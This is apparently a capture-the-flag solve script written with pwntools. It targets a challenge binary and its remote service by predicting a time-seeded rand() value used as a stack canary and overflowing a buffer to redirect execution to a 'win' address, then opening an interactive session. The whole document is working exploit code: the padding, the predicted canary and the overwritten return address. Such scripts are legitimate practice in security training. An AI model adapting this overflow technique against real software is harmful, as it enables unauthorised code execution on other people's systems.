from pwn import *
import ctypes
from time import time
context.binary = "./chal"
context.terminal = ["tmux","splitw","-h"]
lib = ctypes.CDLL("/lib/x86_64-linux-gnu/libc.so.6")
now = int(time())
lib.srand(now)
a = lib.rand()
p = remote("amt.rs",31175)
p = process()
canary = 44
gdb.attach(p)
win = 0x00000000004012b6
payload = b'A'*canary + p64(a) + b'B'*4+p64(win)
p.sendline(b'2')
p.recvuntil(b'guess:')
p.sendline(payload)
p.interactive()
